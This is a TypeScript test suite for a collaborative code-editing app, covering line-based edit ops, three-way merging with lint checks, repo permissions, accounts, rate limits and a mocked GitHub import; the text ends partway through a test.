import { afterAll, describe, expect, test } from "bun:test";
import { apply, empty, fromText, merge, mergeWords, replay, text, type Applied, type Doc } from "../src/lines.ts";
import { diffToOps } from "../src/sync.ts";
import { lintMerge, newProblems } from "../src/lint.ts";
import { local as boot, type Call } from "../src/local.ts";
import { run } from "../agents.ts";
import { GameRoom } from "../src/game-do.ts";
import { noodles } from "../src/noodles.ts";
import { isBuildFile } from "../src/buildfiles.ts";

// Every app instance makes a temp dir of git repos; remove them all at the end.
const opened: { close(): void }[] = [];
afterAll(() => { for (const o of opened) o.close(); });
const local = async (extra?: Record<string, string>) => { const c = await boot(extra); opened.push(c); return c; };

const post = (call: Call, user: string | null, path: string, body: unknown) =>
  call(user, path, { method: "POST", body: JSON.stringify(body) });

describe("lines", () => {
  test("ops address lines by id, so edits elsewhere don't shift them", () => {
    const doc = empty();
    apply(doc, fromText("a\nb\nc"), "me");
    expect(apply(doc, [{ kind: "insert", after: null, text: "top" }], "x").ok).toBe(true);
    // L2 is still "b" even though everything moved down one.
    expect(apply(doc, [{ kind: "set", line: "L2", base: 2, text: "B" }], "y").ok).toBe(true);
    expect(text(doc)).toBe("top\na\nB\nc");
  });

  test("ifRev pins a batch to the whole file", () => {
    const doc = empty();
    apply(doc, fromText("a\nb"), "me");
    apply(doc, [{ kind: "set", line: "L2", base: 2, text: "B" }], "x");
    expect(apply(doc, [{ kind: "set", line: "L1", base: 1, text: "A" }], "y", 0, 2).ok).toBe(false);
    expect(apply(doc, [{ kind: "set", line: "L1", base: 1, text: "A" }], "y", 0, 3).ok).toBe(true);
  });

  test("a stale base is a conflict and the batch is all-or-nothing", () => {
    const doc = empty();
    apply(doc, fromText("a\nb"), "me");
    apply(doc, [{ kind: "set", line: "L1", base: 1, text: "A" }], "x");
    const r = apply(doc, [{ kind: "set", line: "L2", base: 2, text: "B" }, { kind: "set", line: "L1", base: 1, text: "nope" }], "y");
    expect(r.ok).toBe(false);
    expect(text(doc)).toBe("A\nb");
  });

  test("replaying the log rebuilds any past rev, blame included", () => {
    const doc = empty(), log: Applied[] = [];
    const go = (r: ReturnType<typeof apply>) => { if (r.ok) log.push(...r.applied); };
    go(apply(doc, fromText("one\ntwo"), "me"));
    go(apply(doc, [{ kind: "set", line: "L1", base: 1, text: "ONE" }], "x"));
    go(apply(doc, [{ kind: "delete", line: "L2", base: 2 }], "y"));
    expect(text(replay(log, 2))).toBe("one\ntwo");
    expect(replay(log, 3).lines[0]).toEqual({ id: "L1", text: "ONE", by: "x", rev: 3 });
    expect(replay(log)).toEqual(doc);
  });
});

describe("merge", () => {
  const fork = (content: string) => { const main = empty(); apply(main, fromText(content), "me"); return { base: structuredClone(main), main, branch: structuredClone(main) }; };
  const land = (main: Doc, m: ReturnType<typeof merge>) => { const r = apply(main, m.ops, m.by, 0, main.rev); expect(r.ok).toBe(true); return text(main); };

  test("lines only one side touched merge cleanly, each keeping its author", () => {
    const { base, main, branch } = fork("a\nb\nc");
    apply(main, [{ kind: "set", line: "L1", base: 1, text: "A" }, { kind: "insert", after: "L3", text: "main's" }], "ana");
    apply(branch, [{ kind: "set", line: "L2", base: 2, text: "B" }, { kind: "insert", after: "L2", text: "x" }, { kind: "insert", after: "L4", text: "y" }, { kind: "delete", line: "L3", base: 3 }], "bot");
    const m = merge(base, branch, main, {}, "bot");
    expect(m.conflicts).toEqual([]);
    expect(land(main, m)).toBe("A\nB\nx\ny\nmain's");
    expect(main.lines.map((l) => l.by)).toEqual(["ana", "bot", "bot", "bot", "ana"]);
  });

  test("a line both sides changed is a conflict until it's settled", () => {
    const { base, main, branch } = fork("a\nb");
    apply(main, [{ kind: "set", line: "L1", base: 1, text: "main" }, { kind: "delete", line: "L2", base: 2 }], "ana");
    apply(branch, [{ kind: "set", line: "L1", base: 1, text: "branch" }, { kind: "set", line: "L2", base: 2, text: "B" }], "bot");
    // Main deleted L2 where the branch changed it: the two lines are one stretch both reshaped.
    expect(merge(base, branch, main).conflicts).toEqual([{ line: "L1", base: "a\nb", main: "main", branch: "branch\nB" }]);
    expect(land(structuredClone(main), merge(base, branch, main, { L1: "branch" }))).toBe("branch\nB");
    expect(land(structuredClone(main), merge(base, branch, main, { L1: "main" }))).toBe("main");
  });

  test("the same change on both sides, or a line deleted on both, is no change", () => {
    const { base, main, branch } = fork("a\nb");
    for (const d of [main, branch]) apply(d, [{ kind: "set", line: "L1", base: 1, text: "A" }, { kind: "delete", line: "L2", base: 2 }], "x");
    expect(merge(base, branch, main)).toEqual({ ops: [], by: [], conflicts: [] });
  });

  // Each side edits as an agent would: plain text, diffed back to line ops.
  const sides = (content: string, onMain: string, onBranch: string) => {
    const f = fork(content);
    apply(f.main, diffToOps(f.main.lines, onMain.split("\n")), "ana");
    apply(f.branch, diffToOps(f.branch.lines, onBranch.split("\n")), "bot");
    return f;
  };
  const clean = (content: string, onMain: string, onBranch: string) => {
    const { base, main, branch } = sides(content, onMain, onBranch), m = merge(base, branch, main, {}, "bot");
    expect(m.conflicts).toEqual([]);
    return land(main, m);
  };

  test("a line moved on one side keeps the other side's edit", () => {
    expect(clean("# T\na\nb\nc", "# T\nb\na\nc", "# T\nA\nb\nc")).toBe("# T\nb\nA\nc");
    expect(clean("# T\na\nb\nc", "# T\nA\nb\nc", "# T\nb\na\nc")).toBe("# T\nb\nA\nc");
    // Moved on main, deleted on the branch: it's gone.
    expect(clean("# T\na\nb\nc", "# T\nb\na\nc", "# T\nb\nc")).toBe("# T\nb\nc");
    // Moved on both: it lands once, where main put it.
    expect(clean("# T\na\nb\nc", "# T\nb\nc\na", "# T\nb\na\nc")).toBe("# T\nb\nc\na");
  });

  test("the same new line added at the same spot on both sides lands once", () => {
    expect(clean("# T\na", "# T\nimport y\nimport z\na", "# T\nimport z\na")).toBe("# T\nimport y\nimport z\na");
    // Apart, they're two lines someone meant.
    expect(clean("a\nb\nc", "z\na\nb\nc", "a\nb\nc\nz")).toBe("z\na\nb\nc\nz");
  });

  test("a line both sides changed merges word by word when the edits don't touch", () => {
    expect(clean("x\n  foo(1, 2)\ny", "x\n    foo(1, 2)\ny", "x\n  foo(1, 3)\ny")).toBe("x\n    foo(1, 3)\ny");
    expect(mergeWords("let a = 1;", "const a = 1;", "let a = 2;")).toBe("const a = 2;");
    // The same words rewritten two ways is still a conflict.
    expect(mergeWords("foo(1)", "foo(2)", "foo(3)")).toBeNull();
    const { base, main, branch } = sides("x\nfoo(1)", "x\nfoo(2)", "x\nfoo(3)");
    expect(merge(base, branch, main).conflicts).toEqual([{ line: "L2", base: "foo(1)", main: "foo(2)", branch: "foo(3)" }]);
    // A rename on one side and a new use of the old name on the other: merged, it would use a name that's gone.
    expect(mergeWords("const r = f(); g(r.ok)", "const r = f(); if (r) g(r.ok)", "const t = f(); g(t.ok)")).toBeNull();
  });

  test("a stretch both sides rewrote is one conflict, settled whole", () => {
    // Both rewrote tryWith (from PR #243 against main): no half of each.
    const was = "a\nconst tryWith = (us) => tester(remote, us);\nconst all = tryWith(updates);\nz";
    const onMain = "a\nlet slowest = 0;\nconst tryWith = async (us) => {\n  slowest = 1;\n  return tester(remote, us);\n};\nconst all = tryWith(updates);\nz";
    const onBranch = "a\nconst tryWith = async (us) => { const t = await tester(r, us); tried.set(us, t); return t; };\nconst all = tryWith(updates);\nz";
    const { base, main, branch } = sides(was, onMain, onBranch), m = merge(base, branch, main);
    expect(m.conflicts).toEqual([{ line: "L2", base: "const tryWith = (us) => tester(remote, us);", main: onMain.split("\n").slice(1, 6).join("\n"), branch: onBranch.split("\n")[1] }]);
    expect(land(structuredClone(main), merge(base, branch, main, { L2: "branch" }))).toBe(onBranch);
    expect(land(structuredClone(main), merge(base, branch, main, { L2: "main" }))).toBe(onMain);
    // The same rewrite on both sides is no conflict.
    expect(clean(was, onMain, onMain)).toBe(onMain);
  });

  test("a settled merge that would no longer build is a conflict until someone lands it anyway", () => {
    // PR #243's deps.ts: keeping the branch's tryWith drops the `short` main declared, and main's later line still reads it.
    const was = "const tryWith = (us) => tester(us);\nconst all = tryWith(updates);\nlog(all);";
    const onMain = "let short = false;\nconst tryWith = async (us) => {\n  short = true;\n  return tester(us);\n};\nconst all = tryWith(updates);\nlog(all);\nif (short) log(\"short\");";
    const onBranch = "const tryWith = async (us) => tester(us, tried);\nconst all = tryWith(updates);\nlog(all);";
    const { base, main, branch } = sides(was, onMain, onBranch), m = merge(base, branch, main, { L1: "branch" });
    expect(m.conflicts).toEqual([]);
    // The globals both sides use (tester, log, updates) and the branch's own `tried` aren't new.
    expect(lintMerge("deps.ts", main, branch, m, { L1: "branch" })).toEqual([{ line: "lint:undefined:short", base: "", main: null, branch: null, lint: "`short` is not defined (line 4)" }]);
    expect(lintMerge("deps.ts", main, branch, m, { L1: "branch", "lint:undefined:short": "branch" })).toEqual([]);
    // Only code is checked.
    expect(lintMerge("deps.md", main, branch, m)).toEqual([]);
  });

  test("the merge check: redeclared names, undefined names and broken syntax, new ones only", () => {
    const keys = (merged: string, a = "", b = "") => newProblems("x.ts", merged, a, b).map((p) => p.key);
    expect(keys("const tryWith = 1;\nconst tryWith = 2;")).toEqual(["redeclared:tryWith"]);
    expect(keys("if (a {")).toEqual(["syntax:UnexpectedToken"]);
    expect(keys("f(a, b)", "f(a)", "f(b)")).toEqual([]);
    // Scopes, hoisting, patterns, types, keys and labels aren't uses of an undefined name.
    expect(keys([
      "import { a } from './a'; import type { T } from './t';",
      "export function f<U>({ b, c: [d] = [] }: T, ...e: U[]): T { return g(a, b, d, e, h, arguments) }",
      "function g(...xs: unknown[]) { var h = 1; return xs }",
      "const o = { k: 1, m() { return this.k }, [a]: 2 }; o.k; out: for (const [i, j] of Object.entries(o)) { if (i) break out; j }",
      "class C extends Array<T> { #p = 1; static s = C; q(x = this.#p) { try {} catch ({ message }) { return message ?? x } } }",
      "enum E { A = 1 } namespace N { export const v = E.A } declare const env: { z: number }; env.z as number; N.v; new C();",
    ].join("\n"))).toEqual(["undefined:h", "undefined:Object", "undefined:Array"]);
  });

  test("the same line added on both sides in different places would land twice: a conflict", () => {
    const { base, main, branch } = sides("a\nb\nc", "import { z } from './z'\na\nb\nc", "a\nb\nimport { z } from './z'\nc");
    const m = merge(base, branch, main);
    expect(m.conflicts).toEqual([{ line: "L4", base: "", main: "import { z } from './z'", branch: "import { z } from './z'", doubled: true }]);
    expect(land(structuredClone(main), merge(base, branch, main, { L4: "main" }))).toBe("import { z } from './z'\na\nb\nc");
    expect(land(structuredClone(main), merge(base, branch, main, { L4: "branch" }))).toBe("import { z } from './z'\na\nb\nimport { z } from './z'\nc");
    // A short or bare line ("}", "return;") repeats all the time: it isn't flagged.
    expect(clean("a\nb\nc", "}\na\nb\nc", "a\nb\n}\nc")).toBe("}\na\nb\n}\nc");
  });
});

describe("app", () => {
  test("private repos are invisible to everyone else, in search too", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "secret", visibility: "private" });
    await post(call, "ana", "/api/repos/ana/secret/files", { path: "x.ts", content: "const hidden_tuba = 1" });
    await post(call, "ana", "/api/repos/ana/secret/do/commit?path=x.ts", {});

    expect((await call("bo", "/api/repos/ana/secret")).status).toBe(404);
    expect((await call(null, "/api/repos/ana/secret/do/file?path=x.ts")).status).toBe(404);
    expect(await (await call("bo", "/api/search?q=hidden_tuba")).json()).toEqual([]);
    expect(await (await call("ana", "/api/search?q=hidden_tuba")).json()).toHaveLength(1);
    expect((await call("bo", "/api/users/ana").then((r) => r.json()) as any).repos).toEqual([]);
  });

  test("only owners and collaborators write", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "a", content: "x" });
    const op = { ops: [{ kind: "insert", after: null, text: "hi" }] };
    expect((await post(call, "bo", "/api/repos/ana/r/do/ops?path=a", op)).status).toBe(403);
    await post(call, "ana", "/api/repos/ana/r/collaborators", { name: "bo" });
    expect((await post(call, "bo", "/api/repos/ana/r/do/ops?path=a", op)).status).toBe(200);
  });

  test("a playlist track is a line range, read live from the file", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "a.js", content: "1\n2\n3\n4" });
    const pl = await (await post(call, "bo", "/api/playlists", { title: "tasty" })).json() as any;
    expect((await post(call, "bo", `/api/playlists/${pl.id}/tracks`, { owner: "ana", repo: "r", path: "a.js", from: 2, to: 3, note: "nice" })).status).toBe(201);
    const got = await (await call(null, `/api/playlists/${pl.id}`)).json() as any;
    expect(got.tracks[0].lines.map((l: any) => l.text)).toEqual(["2", "3"]);
    // Two lines land above it: the track follows its lines, not the numbers.
    await post(call, "ana", "/api/repos/ana/r/do/ops?path=a.js", { ops: [{ kind: "insert", after: null, text: "new" }, { kind: "insert", after: null, text: "newer" }] });
    const moved = await (await call(null, `/api/playlists/${pl.id}`)).json() as any;
    expect(moved.tracks[0].lines.map((l: any) => l.text)).toEqual(["2", "3"]);
    expect([moved.tracks[0].from_line, moved.tracks[0].to_line]).toEqual([4, 5]);
  });

  test("three agents editing one file at once converge, and the commit indexes it", async () => {
    const { doc, stats, commit } = await run(await local(), { log: () => {} });
    const t = doc.lines.map((l: any) => l.text).join("\n");
    expect(t).not.toMatch(/\bfoo\b|^var /m);
    // The linter's const-or-let needs the whole file to hold still (ifRev), so it's right.
    expect(t).toContain("let total = 0");
    expect(t).toContain('const label = "sum is"');
    expect(t.match(/^\/\*\*/gm)).toHaveLength(3);
    expect(commit.rev).toBe(doc.rev);
    expect(Object.values(stats).every((s) => s.edits > 0)).toBe(true);
  });
});

describe("artifacts", () => {
  test("cataloguing pushes the repo's catalogued files as a git commit you can clone", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "dig" });
    await post(call, "ana", "/api/repos/ana/dig/files", { path: "src/a.ts", content: "export const a = 1" });
    await post(call, "ana", "/api/repos/ana/dig/files", { path: "README", content: "found it" });
    const c1 = await (await post(call, "ana", "/api/repos/ana/dig/do/commit?path=src%2Fa.ts", { message: "first find" })).json() as any;
    expect(c1.git.commit).toMatch(/^[0-9a-f]{40}$/);
    const c2 = await (await post(call, "ana", "/api/repos/ana/dig/do/commit?path=README", { message: "second" })).json() as any;
    expect(c2.git.parent).toBe(c1.git.commit);

    const repo = await call.artifacts.get("ana--dig");
    expect((await repo.log()).map((c) => c.message)).toEqual(["second", "first find"]);
    expect(await (await repo.readFile({ ref: "main", path: "src/a.ts" }))!.text()).toBe("export const a = 1\n");

    // The clone command on the repo page works with a stock git client.
    const { clone } = await (await call(null, "/api/repos/ana/dig")).json() as any;
    const dir = (await import("node:fs")).mkdtempSync((await import("node:path")).join((await import("node:os")).tmpdir(), "cs-clone-"));
    const p = Bun.spawn(["sh", "-c", clone], { cwd: dir, stdout: "pipe", stderr: "pipe" });
    expect(await p.exited).toBe(0);
    expect(await Bun.file(`${dir}/dig/README`).text()).toBe("found it\n");
    (await import("node:fs")).rmSync(dir, { recursive: true, force: true });
  });
});

describe("levels", () => {
  test("browse a level, fork it, open a deep file, catalogue it: the push keeps every other file", async () => {
    const call = await local();
    // Stand in for an import (which needs the network): a repo with a few files, marked ready.
    const ns = call.artifacts, { push } = await import("../src/git.ts");
    const made = await ns.create("level-hono");
    await push(made.remote, made.token, { changes: { "README.md": "hono\n", "src/a.ts": "export const a = 1\n", "src/deep/b.ts": "b\n" }, message: "upstream", author: "upstream" });
    await call.env.DB.prepare("INSERT INTO levels (slug, status) VALUES ('hono', 'ready')").run();

    const levels = await (await call(null, "/api/levels")).json() as any[];
    expect(levels.map((l) => l.slug)).toEqual(["mitt", "clsx", "ky", "zustand", "hono", "express", "preact"]);
    expect(levels[4].status).toBe("ready");
    expect(levels[6].status).toBe("buried");
    const root = await (await call(null, "/api/levels/hono/tree")).json() as any;
    expect(root.entries.map((e: any) => [e.name, e.type])).toEqual([["src", "dir"], ["README.md", "file"]]);
    expect((await (await call(null, "/api/levels/hono/tree?path=src")).json() as any).entries.map((e: any) => e.path)).toEqual(["src/deep", "src/a.ts"]);
    expect((await (await call(null, "/api/levels/hono/file?path=src/a.ts")).json() as any).text).toBe("export const a = 1\n");
    expect((await call(null, "/api/levels/preact/tree")).status).toBe(409);             // not excavated yet
    expect((await post(call, null, "/api/levels/preact/import", {})).status).toBe(403);   // and not by strangers

    await post(call, "ana", "/api/login", { name: "ana" });
    expect((await post(call, "ana", "/api/levels/hono/fork", { name: "my-hono" })).status).toBe(201);
    // The fork says where it came from and that its git is local.
    const meta = await (await call("ana", "/api/repos/ana/my-hono")).json() as any;
    expect([meta.upstream, meta.upstream_commit?.length, meta.home]).toEqual(["github:honojs/hono", 40, "local"]);
    const tree = await (await call("ana", "/api/repos/ana/my-hono/tree?path=src/deep")).json() as any;
    expect(tree.entries.map((e: any) => e.path)).toEqual(["src/deep/b.ts"]);

    // Opening a file from history makes it a live DO, attributed to upstream.
    const f = "/api/repos/ana/my-hono/do", q = "?path=" + encodeURIComponent("src/deep/b.ts");
    const doc = await (await call("ana", `${f}/file${q}`)).json() as any;
    expect(doc.lines.map((l: any) => [l.text, l.by])).toEqual([["b", "upstream"]]);
    await post(call, "ana", `${f}/ops${q}`, { ops: [{ kind: "set", line: doc.lines[0].id, base: doc.lines[0].rev, text: "B, dug up" }] });
    const c = await (await post(call, "ana", `${f}/commit${q}`, { message: "dig" })).json() as any;
    expect(c.git.commit).toMatch(/^[0-9a-f]{40}$/);

    const repo = await ns.get("ana--my-hono");
    expect((await repo.log()).map((x) => x.message)).toEqual(["dig", "upstream"]);
    expect(await (await repo.readFile({ ref: "main", path: "src/deep/b.ts" }))!.text()).toBe("B, dug up\n");
    expect(await (await repo.readFile({ ref: "main", path: "src/a.ts" }))!.text()).toBe("export const a = 1\n");
    expect(await (await repo.readFile({ ref: "main", path: "README.md" }))!.text()).toBe("hono\n");
    // The level itself is untouched.
    expect((await (await ns.get("level-hono")).log()).length).toBe(1);
  });
});

/** The app with accounts on, and helpers to sign up, pick a handle and ask who you are. */
async function accounts(extra: Record<string, string> = {}) {
  const origin = "http://codesplitters.local";
  const call = await local({ BETTER_AUTH_SECRET: "test-secret-".padEnd(40, "x"), BETTER_AUTH_URL: origin, ...extra });
  const signup = async (email: string, name: string, headers: Record<string, string> = {}) => {
    const res = await call(null, "/api/auth/sign-up/email", { method: "POST", headers: { "content-type": "application/json", origin, ...headers },
      body: JSON.stringify({ email, password: "correct horse battery", name }) });
    return (res.headers.getSetCookie?.() ?? [res.headers.get("set-cookie")!]).map((c) => c.split(";")[0]).join("; ");
  };
  const session = async (cookie = "") => (await (await call(null, "/api/session", { headers: { cookie } })).json()) as any;
  const claim = (cookie: string, name: string, headers: Record<string, string> = {}) =>
    call(null, "/api/handle", { method: "POST", headers: { cookie, ...headers }, body: JSON.stringify({ name }) });
  /** Sign up and claim `handle`: the cookie of someone ready to dig. */
  const person = async (email: string, handle: string) => { const c = await signup(email, handle); expect((await claim(c, handle)).status).toBe(201); return c; };
  return { call, signup, session, claim, person };
}

describe("accounts", () => {
  test("with a secret set, Better Auth signs people up, then they pick the handle the app sees", async () => {
    const { call, signup, session, claim } = await accounts();
    expect(await session()).toEqual({ mode: "accounts", user: null, providers: ["email"] });
    expect((await post(call, null, "/api/login", { name: "ana" })).status).toBe(404);   // no aliases now

    const cookie = await signup("ana@example.com", "Ana Lyst");
    // Signed in, no handle yet: the page is offered a free one to start from.
    expect(await session(cookie)).toMatchObject({ user: null, pick: { suggest: "ana-lyst", email: "ana@example.com" } });
    expect((await call(null, "/api/repos", { method: "POST", headers: { cookie }, body: JSON.stringify({ name: "dig" }) })).status).toBe(401);
    expect((await claim(cookie, "analyst")).status).toBe(201);
    expect((await session(cookie)).user).toBe("analyst");
    expect((await session(cookie)).pick).toBeUndefined();
    expect((await claim(cookie, "another-one")).status).toBe(409);                        // once, for good
    const me = await (await call(null, "/api/me", { headers: { cookie } })).json() as any;
    expect(me.name).toBe("analyst");
    expect((await call(null, "/api/repos", { method: "POST", headers: { cookie }, body: JSON.stringify({ name: "dig" }) })).status).toBe(201);
  });
});

describe("handles", () => {
  test("six or more characters, free, and not an agent's; an admin gives out short ones by email", async () => {
    const { call, signup, session, claim, person } = await accounts({ ADMINS: "boss-person" });
    const free = async (name: string) => (await (await call(null, `/api/handle?name=${name}`)).json()) as any;
    const boss = await person("boss@example.com", "boss-person");
    expect(await session(boss)).toMatchObject({ user: "boss-person", admin: true });

    const ana = await signup("ana@example.com", "Ana");
    expect((await session(ana)).pick.suggest).toBe("ana-digger");                        // too short to offer
    expect((await claim(ana, "ana")).status).toBe(400);
    expect(await free("ana")).toEqual({ name: "ana", ok: false, why: "at least 6 characters" });
    expect(await free("boss-person")).toMatchObject({ ok: false, why: "taken" });
    expect((await claim(ana, "boss-person")).status).toBe(409);
    expect((await claim(ana, "Ana_Bee")).status).toBe(400);
    expect(await free("agent-codex")).toMatchObject({ ok: false, why: "agent- handles are for coding agents" });
    expect(await free("anabee")).toMatchObject({ ok: true });
    expect((await claim(ana, "anabee")).status).toBe(201);

    const grant = (cookie: string, body: unknown) => call(null, "/api/admin/handles", { method: "POST", headers: { cookie }, body: JSON.stringify(body) });
    expect((await grant(ana, { handle: "zed", email: "zed@example.com" })).status).toBe(403);   // admins only
    expect((await grant(boss, { handle: "boss-person", email: "x@example.com" })).status).toBe(409);
    expect((await grant(boss, { handle: "agent-codex", email: "y@example.com" })).status).toBe(400);
    // A grant goes to a verified email only, since anyone can type one at signup.
    const typed = await signup("zed2@example.com", "Zed");
    const verified = await signup("zed3@example.com", "Zed");
    expect((await grant(boss, { handle: "zed", email: "zed3@example.com" })).status).toBe(201);
    expect(await free("zed")).toMatchObject({ ok: false });
    await call.env.DB.prepare(`UPDATE "user" SET emailVerified = 1 WHERE email = 'zed3@example.com'`).run();
    expect((await session(typed)).user).toBeNull();
    expect((await session(verified)).user).toBe("zed");

    const alias = await local();
    expect((await post(alias, null, "/api/login", { name: "agent-codex" })).status).toBe(400);
  });
});

describe("rate limits", () => {
  const ip = { "cf-connecting-ip": "203.0.113.7" };

  test("count requests from the internet, per IP before sign-in and per handle after", async () => {
    const { call, signup, claim, person } = await accounts({ ADMINS: "boss-person" });
    const boss = await person("boss@example.com", "boss-person");
    // Five accounts an hour from one IP; the desktop and the tests (no cf-connecting-ip) are never counted.
    for (let i = 0; i < 5; i++) await signup(`u${i}@example.com`, `User ${i}`, ip);
    const sixth = await call(null, "/api/auth/sign-up/email", { method: "POST", headers: { "content-type": "application/json", origin: "http://codesplitters.local", ...ip },
      body: JSON.stringify({ email: "u6@example.com", password: "correct horse battery", name: "u6" }) });
    expect(sixth.status).toBe(429);
    expect(Number(sixth.headers.get("retry-after"))).toBeGreaterThan(0);
    expect((await call(null, "/api/search?q=x", { headers: ip })).status).toBe(200);

    // An admin turns the repo limit down to one a day.
    const put = (cookie: string, rules: unknown) => call(null, "/api/admin/limits", { method: "PUT", headers: { cookie }, body: JSON.stringify({ rules }) });
    const ana = await person("ana@example.com", "ana-lyst");
    expect((await put(ana, [])).status).toBe(403);
    expect((await put(boss, [{ name: "repo", max: 0, window_s: 60, enabled: true }])).status).toBe(400);
    expect((await put(boss, [{ name: "repo", max: 1, window_s: 86400, enabled: true }])).status).toBe(200);
    const repo = (cookie: string, name: string) => call(null, "/api/repos", { method: "POST", headers: { cookie, ...ip }, body: JSON.stringify({ name }) });
    expect((await repo(ana, "one")).status).toBe(201);
    const over = await repo(ana, "two");
    expect(over.status).toBe(429);
    expect(((await over.json()) as any).error).toMatch(/new repos is limited to 1 per day/);
    expect((await repo(boss, "one")).status).toBe(201);                                  // admins aren't limited
    expect((await repo(boss, "two")).status).toBe(201);

    const { rules } = (await (await call(null, "/api/admin/limits", { headers: { cookie: boss } })).json()) as any;
    expect(rules.find((r: any) => r.name === "repo")).toMatchObject({ max: 1, now: { callers: 1, hits: 2, blocked: 1 } });
    expect(rules.find((r: any) => r.name === "signup")).toMatchObject({ max: 5, now: { callers: 1, hits: 6, blocked: 1 } });

    // Switched off, it counts nothing.
    await put(boss, [{ name: "repo", max: 1, window_s: 86400, enabled: false }]);
    expect((await repo(ana, "three")).status).toBe(201);
    expect((await claim(ana, "nope-nope", ip)).status).toBe(409);
  });
});

describe("github", () => {
  test("a repo out of anything copied from GitHub", async () => {
    const { parseRepo } = await import("../src/github.ts");
    for (const s of ["honojs/hono", "https://github.com/honojs/hono", "github.com/honojs/hono/", "https://www.github.com/honojs/hono/tree/main/src",
      "https://github.com/honojs/hono/blob/main/src/index.ts#L10", "https://github.com/honojs/hono/pull/12", "git@github.com:honojs/hono.git",
      "ssh://git@github.com/honojs/hono.git", "git clone https://github.com/honojs/hono.git", "git clone --depth 1 git@github.com:honojs/hono.git my-dir",
      "gh repo clone honojs/hono", "https://raw.githubusercontent.com/honojs/hono/main/README.md", "https://github.com/honojs/hono?tab=readme"])
      expect([s, parseRepo(s)]).toEqual([s, "honojs/hono"]);
    for (const s of ["hono", "https://gitlab.com/a/b", "not a repo"]) expect(parseRepo(s)).toBeNull();
  });

  test("search GitHub; a visitor's dig expires in a day, and the oldest goes once too many are live", async () => {
    const call = await local({ GH_CLI: "off", ADMINS: "boss", DIG_CAP: "2" });
    const real = globalThis.fetch, searched: string[] = [];
    globalThis.fetch = (async (u: string) => {
      const url = new URL(u), m = /^\/repos\/([^/]+\/[^/]+)(\/commits\/main)?$/.exec(url.pathname);
      if (url.pathname === "/search/repositories") { searched.push(url.searchParams.get("q")!); return Response.json({ items: [{ full_name: "o/tiny", description: "d", stargazers_count: 5, language: "TS" }] }); }
      if (m && m[2]) return Response.json({ sha: "c".repeat(40) });
      if (m) return Response.json({ full_name: m[1], private: false, default_branch: "main" });
      return new Response("{}", { status: 404 });
    }) as any;
    const deleted: string[] = [];
    call.artifacts.import = (async (params: any) => call.artifacts.create(params.target.name, { setDefaultBranch: "main" })) as any;
    const del = call.artifacts.delete.bind(call.artifacts);
    call.artifacts.delete = (async (n: string) => { deleted.push(n); return del(n); }) as any;
    try {
      for (const u of ["ana", "bo", "boss"]) await post(call, u, "/api/login", { name: u });
      expect(await (await call(null, "/api/github/search?q=tiny")).json()).toEqual({ repos: [{ repo: "o/tiny", description: "d", stars: 5, language: "TS" }] });
      expect(searched).toEqual(["tiny is:public"]);

      const one = (await (await post(call, "ana", "/api/github/dig", { repo: "o/one" })).json()) as any;
      expect(one.expires_at - Date.now()).toBeGreaterThan(23 * 3600_000);
      // Ana opens a file, so evicting it has a Durable Object to wipe.
      await post(call, "ana", "/api/repos/ana/one/files", { path: "a.ts", content: "x\n" });
      await post(call, "bo", "/api/github/dig", { repo: "o/two" });
      expect((await post(call, "boss", "/api/github/dig", { repo: "o/keep" })).status).toBe(201);   // an admin's keeps
      expect((await (await post(call, "boss", "/api/github/dig", { repo: "o/keep", name: "keep-2" })).json() as any).expires_at).toBeUndefined();

      // A third visitor's dig past the cap of two: ana's, the oldest, goes.
      expect((await post(call, "bo", "/api/github/dig", { repo: "o/three" })).status).toBe(201);
      expect(deleted).toEqual(["ana--one"]);
      expect((await call("ana", "/api/repos/ana/one")).status).toBe(404);
      expect(await call.env.DB.prepare("SELECT path FROM files WHERE owner = 'ana'").all()).toMatchObject({ results: [] });
      // And she can dig it up again, fresh.
      await post(call, "ana", "/api/github/dig", { repo: "o/one" });
      expect(((await (await call("ana", "/api/repos/ana/one/do/file?path=a.ts")).json()) as any).error).toBeDefined();

      // Past its day, a dig is gone at once, swept or not.
      await call.env.DB.prepare("UPDATE repos SET expires_at = ? WHERE owner = 'bo' AND name = 'three'").bind(Date.now() - 1).run();
      expect((await call("bo", "/api/repos/bo/three")).status).toBe(404);
      expect((await (await call("bo", "/api/users/bo")).json() as any).repos.map((r: any) => r.name)).toEqual([]);
      expect((await call("boss", "/api/repos/boss/keep")).status).toBe(200);
    } finally { globalThis.fetch = real; }
  });

  test("dig up a GitHub repo: a fork you own, with where it came from", async () => {
    const call = await local({ GH_CLI: "off", GITHUB_TOKEN: "t0k" });
    // GitHub's API, faked; and the import, made local (a real one clones over the network).
    const real = globalThis.fetch, seen: string[] = [];
    globalThis.fetch = (async (u: string, init?: RequestInit) => {
      seen.push(`${u} ${new Headers(init?.headers).get("authorization")}`);
      const path = new URL(u).pathname;
      if (path === "/user") return Response.json({ login: "ana-gh" });
      if (path === "/user/repos") return Response.json([{ full_name: "ana-gh/Tiny.JS", private: false, default_branch: "trunk" }, { full_name: "ana-gh/secret", private: true, default_branch: "main" }]);
      if (path === "/repos/ana-gh/Tiny.JS") return Response.json({ full_name: "ana-gh/Tiny.JS", private: false, default_branch: "trunk" });
      if (path === "/repos/ana-gh/secret") return Response.json({ full_name: "ana-gh/secret", private: true, default_branch: "main" });
      if (path === "/repos/ana-gh/Tiny.JS/commits/trunk") return Response.json({ sha: "a".repeat(40) });
      if (path === "/repos/ana-gh/secret/commits/main") return Response.json({ sha: "b".repeat(40) });
      return new Response("{}", { status: 404 });
    }) as any;
    const imports: any[] = [];
    call.artifacts.import = (async (params: any) => { imports.push(params); return call.artifacts.create(params.target.name, { setDefaultBranch: params.source.branch }); }) as any;
    try {
      await post(call, "ana", "/api/login", { name: "ana" });
      const list = await (await call("ana", "/api/github/repos")).json() as any;
      expect([list.via, list.login, list.privateOk, list.repos.map((r: any) => [r.repo, r.private])]).toEqual(["secret", "ana-gh", true, [["ana-gh/Tiny.JS", false], ["ana-gh/secret", true]]]);
      expect(seen[0]).toEndWith("Bearer t0k");

